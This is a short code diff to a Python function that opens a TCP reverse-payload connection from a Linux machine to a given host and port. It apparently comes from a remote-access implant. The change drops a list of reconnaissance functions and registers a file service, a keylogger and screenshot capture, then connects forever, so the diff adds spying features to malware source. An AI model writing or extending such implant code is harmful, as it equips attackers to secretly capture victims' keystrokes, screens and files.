@@ -10,19 +10,9 @@ def _linux_connect(args):
     host, port = addr = args.host, args.port
 
     with payload.TCPReversePayload(addr) as p:
-        funcs = [
-                payload.get_username,
-                payload.get_hostname,
-                payload.get_platform,
-                payload.list_dir,
-                payload.change_dir,
-                payload.get_current_dir,
-                payload.get_file_size,
-                payload.uname,
-        ]
-        for f in funcs:
-            p.register_function(f)
-        p.register_instance(payload.FileService())
+        p.register_file_service()
+        p.register_keylogger()
+        p.register_screenshot()
         p.connect_forever()
 
 
